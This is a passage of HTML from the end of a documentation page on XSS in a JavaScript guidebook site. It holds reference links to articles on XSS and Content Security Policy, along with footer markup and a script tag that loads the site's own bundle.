d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li><a target="_blank" rel="noopener noreferrer" href="https://yq.aliyun.com/articles/638829">📝 Web 安全系列：XSS 攻击基础及原理<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li><a target="_blank" rel="noopener noreferrer" href="https://yq.aliyun.com/articles/638935?spm=a2c4e.11153940.blogcont638829.21.74d874d3lHE0qK">📝 Web 安全系列：XSS 攻击进阶<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li><a target="_blank" rel="noopener noreferrer" href="https://yq.aliyun.com/articles/641535?spm=a2c4e.11153940.blogcont638935.16.6e757039SLyW6B">📝 Web 安全系列：XSS 攻击进阶<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li><a target="_blank" rel="noopener noreferrer" href="http://www.ruanyifeng.com/blog/2016/09/csp.html">📝 阮一峰 Content Security Policy 入门教程<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li><a target="_blank" rel="noopener noreferrer" href="https://www.cnblogs.com/Wayou/p/intro_to_content_security_policy.html">📝 Content Security Policy（CSP）介绍<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div><div class="__dumi-default-layout-footer-meta"><a target="_blank" rel="noopener noreferrer" href="https://github.com/yyt520/black-javascript-guidebook/edit/master/docs/computer-networks/web-security/xss.md">Edit this doc on GitHub<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a><span data-updated-text="Last update: ">2023/7/9 15:48:07</span></div></div></div></div>
	<script>
  window.g_useSSR = true;
  window.g_initialProps = {};
	</script>

    <script src="/black-javascript-guidebook/umi.397d416d.js"></script>
  </body>
</html>
